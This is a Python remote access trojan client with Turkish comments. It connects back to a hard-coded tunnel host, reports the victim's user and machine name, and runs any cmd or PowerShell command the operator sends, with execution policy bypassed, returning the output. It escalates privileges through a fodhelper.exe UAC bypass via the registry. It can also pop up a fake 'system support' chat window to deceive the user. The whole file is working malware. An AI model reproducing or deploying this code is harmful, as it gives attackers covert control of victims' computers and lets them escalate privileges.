import socket
import threading
import subprocess
import os
import platform
import json
import webbrowser
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext
import winreg
import base64
import tempfile

# --- BAĞLANTI AYARLARI ---
HOST = "uwtd3ffva.localto.net"
PORT = 7243
# -------------------------

class XenonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.chat_win = None
        self.chat_box = None
        self.chat_running = False
        self.running = True

    def get_sys_info(self):
        return json.dumps({
            "id": f"{os.getlogin()}@{platform.node()}",
            "country": "TR",  # İstersen gerçek ülke kodu ekleyebilirsin
            "os": f"{platform.system()} {platform.release()}"
        })

    def uac_bypass(self, cmd_to_run):
        try:
            path = r"Software\Classes\ms-settings\Shell\Open\command"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd_to_run)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            return True
        except Exception as e:
            print(f"[!] UAC bypass hatası: {e}")
            return False

    def connect(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                self.sock.send(self.get_sys_info().encode("utf-8"))
                self.listen()
            except Exception as e:
                print(f"[!] Bağlantı hatası: {e}, 5 sn sonra yeniden deneniyor...")
                time.sleep(5)
            finally:
                if self.sock:
                    try:
                        self.sock.close()
                    except:
                        pass
                    self.sock = None

    def listen(self):
        buffer = ""
        while self.running:
            try:
                data = self.sock.recv(16384).decode("utf-8")
                if not data:
                    break
                buffer += data
                # Basit ayraç: şu an her gelen direkt bir komut olarak kabul ediliyor
                # Eğer komutlar peş peşe gelebiliyorsa, buffer'da birden fazla komut olabilir.
                # Ama mevcut protokolde genelde tek komut gelir.
                # Gelişmiş çözüm için mesaj sonu belirteci kullanılmalı.
                # Şimdilik böyle bırakalım.
                self.process_command(buffer.strip())
                buffer = ""
            except Exception as e:
                print(f"[!] Dinleme hatası: {e}")
                break
        print("[*] Bağlantı koptu, yeniden bağlanılıyor...")

    def process_command(self, data):
        """Gelen komutu işle"""
        if not data:
            return

        if data.startswith("msg|"):
            threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|", 1)[1]), daemon=True).start()

        elif data == "chat_open":
            if not self.chat_running:
                threading.Thread(target=self.gui_chat, daemon=True).start()

        elif data.startswith("chat_msg|"):
            if self.chat_box:
                try:
                    self.chat_box.config(state="normal")
                    self.chat_box.insert(tk.END, f"DESTEK: {data.split('|', 1)[1]}\n")
                    self.chat_box.config(state="disabled")
                    self.chat_box.see(tk.END)
                except:
                    pass

        elif data == "chat_close":
            if self.chat_win:
                self.chat_running = False
                try:
                    self.chat_win.quit()
                except:
                    pass

        elif data == "beep":
            self.beep()

        elif data.startswith("open_url|"):
            webbrowser.open(data.split("|", 1)[1])

        elif data.startswith("shell|"):
            self.run_cmd(data.split("|", 1)[1], "cmd")

        elif data.startswith("ps|"):
            self.run_cmd(data.split("|", 1)[1], "powershell")

        elif data.startswith("elevate|"):
            target = "cmd.exe" if "cmd" in data else "powershell.exe"
            self.uac_bypass(target)

        elif data.startswith("playsound|"):
            parts = data.split("|", 2)
            if len(parts) == 3:
                filename = parts[1]
                encoded = parts[2]
                threading.Thread(target=self.play_audio, args=(filename, encoded), daemon=True).start()

    def beep(self):
        try:
            if platform.system() == "Windows":
                import winsound
                winsound.Beep(800, 500)
            else:
                print('\a')  # Terminal bipi
        except:
            pass

    def run_cmd(self, command_to_run, mode):
        def task():
            try:
                if mode == "powershell":
                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
                else:
                    final_cmd = command_to_run

                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate(timeout=30)
                res = (stdout + stderr).decode("cp857", errors="replace")

                if not res.strip():
                    res = "Komut çalıştırıldı (Çıktı yok)."
                self.sock.send(f"shell_res|{res}".encode("utf-8"))
            except subprocess.TimeoutExpired:
                self.sock.send(b"shell_res|Komut zaman aşımına uğradı.\n")
            except Exception as e:
                self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))
        threading.Thread(target=task, daemon=True).start()

    def play_audio(self, filename, encoded):
        """Base64 ile gelen ses dosyasını çal"""
        try:
            data = base64.b64decode(encoded)
            # Uzantıyı koru
            suffix = os.path.splitext(filename)[1]
            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
                f.write(data)
                temp_path = f.name

            # Dosyayı çal
            self.play_sound_file(temp_path)

            # 15 saniye sonra geçici dosyayı sil (ses muhtemelen bitmiştir)
            threading.Timer(15, lambda: os.unlink(temp_path)).start()
        except Exception as e:
            print(f"[!] Ses çalma hatası: {e}")

    def play_sound_file(self, file_path):
        """Platforma uygun ses çalma yöntemi"""
        system = platform.system()
        try:
            # Öncelikle pygame dene (birçok formatı destekler)
            import pygame
            pygame.mixer.init()
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                time.sleep(0.1)
            pygame.mixer.quit()
        except ImportError:
            # pygame yoksa platforma özel yöntemler
            if system == "Windows":
                if file_path.lower().endswith('.wav'):
                    import winsound
                    winsound.PlaySound(file_path, winsound.SND_FILENAME)
                else:
                    os.startfile(file_path)  # Varsayılan oynatıcıda açar
            elif system == "Linux":
                # ALSA veya PulseAudio dene
                os.system(f"aplay '{file_path}' 2>/dev/null || paplay '{file_path}' 2>/dev/null || xdg-open '{file_path}' 2>/dev/null")
            elif system == "Darwin":  # macOS
                os.system(f"afplay '{file_path}'")
            else:
                print("[!] Ses çalma desteklenmiyor.")
        except Exception as e:
            print(f"[!] play_sound_file hatası: {e}")

    def gui_chat(self):
        """Sohbet penceresi yönetim thread'i"""
        self.chat_running = True
        self.chat_win = tk.Tk()
        self.chat_win.title("Sistem Destek")
        self.chat_win.geometry("350x450")
        self.chat_win.attributes("-topmost", True)

        self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled")
        self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)

        ent = tk.Entry(self.chat_win)
        ent.pack(fill="x", padx=5, pady=5)

        def send_srv(e=None):
            m = ent.get()
            if m:
                self.chat_box.config(state="normal")
                self.chat_box.insert(tk.END, f"Siz: {m}\n")
                self.chat_box.config(state="disabled")
                ent.delete(0, tk.END)
                try:
                    self.sock.send(f"chat|{m}".encode("utf-8"))
                except:
                    pass

        ent.bind("<Return>", send_srv)

        def on_closing():
            self.chat_running = False
            self.chat_win.destroy()
            self.chat_win = None
            self.chat_box = None

        self.chat_win.protocol("WM_DELETE_WINDOW", on_closing)
        self.chat_win.mainloop()
        self.chat_running = False
        self.chat_win = None

if __name__ == "__main__":
    client = XenonClient(HOST, PORT)
    try:
        client.connect()
    except KeyboardInterrupt:
        print("\n[!] Kapatılıyor...")
        client.running = False
